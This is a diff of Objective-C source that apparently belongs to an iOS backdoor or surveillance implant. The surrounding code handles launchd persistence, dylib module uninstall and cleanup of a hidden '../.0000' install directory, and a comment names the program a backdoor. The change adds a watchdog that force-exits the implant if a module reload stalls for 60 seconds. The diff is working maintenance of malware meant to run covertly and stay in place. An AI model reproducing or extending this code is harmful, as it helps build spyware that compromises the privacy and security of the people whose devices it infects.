@@ -31,6 +31,8 @@
 
 #import "RCSIGlobals.h"
 
+#define RESTART_TIMEOUT 60.00
+
 //#define DEBUG_
 //#define __DEBUG_IOS_DYLIB
 
@@ -166,6 +168,10 @@ static NSMutableArray *gCurrProcsList = nil;
 
 @implementation _i_Core (hidden)
 
+#pragma mark -
+#pragma mark Persistent routine
+#pragma mark -
+
 - (void)launchCtl:(char*)aDaemon command:(char*)aCommand
 {
   char statment[256];
@@ -289,6 +295,10 @@ static NSMutableArray *gCurrProcsList = nil;
   return TRUE;
 }
 
+#pragma mark -
+#pragma mark Uninstall
+#pragma mark -
+
 - (BOOL)uninstallExternalModules
 {  
   NSData *dylibName = [gDylibName dataUsingEncoding:NSUTF8StringEncoding];
@@ -395,6 +405,10 @@ static NSMutableArray *gCurrProcsList = nil;
   
   return TRUE;
 }
+
+#pragma mark -
+#pragma mark Startup support routine
+#pragma mark -
 
 - (BOOL)amIAlone
 {
@@ -518,6 +532,24 @@ typedef struct _coreMessage_t
   [msgData release];
 }
 
+/*
+ * Check if backdoor is blocked on restarting mouduels
+ */
+- (void)checkWDTimeout:(NSTimer*)theTimer
+{
+  if (mIsRestarting == TRUE)
+  {
+    /*
+     * timeout reached: exit immediatly and unclean
+     */
+    createInfoLog(@"Reload timeout reached");
+    
+    sleep(1);
+    
+    exit(-1);
+  }
+}
+
 - (void)manageCoreNotification:(uint)aFlag
                    withMessage:(NSData*)aMessage
 {
@@ -531,6 +563,17 @@ typedef struct _coreMessage_t
       [self updateDylibConfigId];
     
       [self setStatus: CORE_STATUS_RELOAD];
+      
+      /*
+       * Start the watchdog: max RESTART_TIMEOUT
+       */
+      mIsRestarting = TRUE;
+      
+      [NSTimer scheduledTimerWithTimeInterval:RESTART_TIMEOUT
+                                       target:self
+                                     selector:@selector(checkWDTimeout:)
+                                     userInfo:nil
+                                      repeats:NO];
     }
   else if (aFlag == CORE_ACTION_STOPPED)
     {
@@ -538,11 +581,11 @@ typedef struct _coreMessage_t
     }
   else if (aFlag == CORE_EVENT_STOPPED)
     {
-      [self resetStatus:  CORE_STATUS_EM_RUN];
+      [self resetStatus: CORE_STATUS_EM_RUN];
     }
   else if (aFlag == CORE_AGENT_STOPPED)
     {
-      [self resetStatus:  CORE_STATUS_MM_RUN];
+      [self resetStatus: CORE_STATUS_MM_RUN];
     }
   else if (aFlag == ACTION_DO_UNINSTALL)
     {
@@ -883,6 +926,8 @@ typedef struct _coreMessage_t
               [self startActionManager] == TRUE && 
               [self startEventManager]  == TRUE)
             {
+              // reset flag checked by watchdog timer
+              mIsRestarting = FALSE;
               [self resetStatus: CORE_STATUS_RELOAD];
             }
           else
@@ -928,7 +973,8 @@ typedef struct _coreMessage_t
       agentManager          = nil;
       mLockSock             = -1;
       mSBPid                = -1;
-    
+      mIsRestarting         = FALSE;
+      
       [self _guessNames];
     }
   
@@ -943,8 +989,10 @@ typedef struct _coreMessage_t
 - (void)cleanUp:(NSTimer*)theTimer
 {
   int zeroChar = 0;
+  
   NSString *installDirName = [NSString stringWithFormat:@"../.%d%d%d%d",
                                                         zeroChar, zeroChar, zeroChar, zeroChar];
+  
   NSString *installLaunchName = [NSString stringWithUTF8String: LAUNCHD_INSTALL_PLIST];
   
   [[NSFileManager defaultManager] removeItemAtPath:installDirName error:nil];
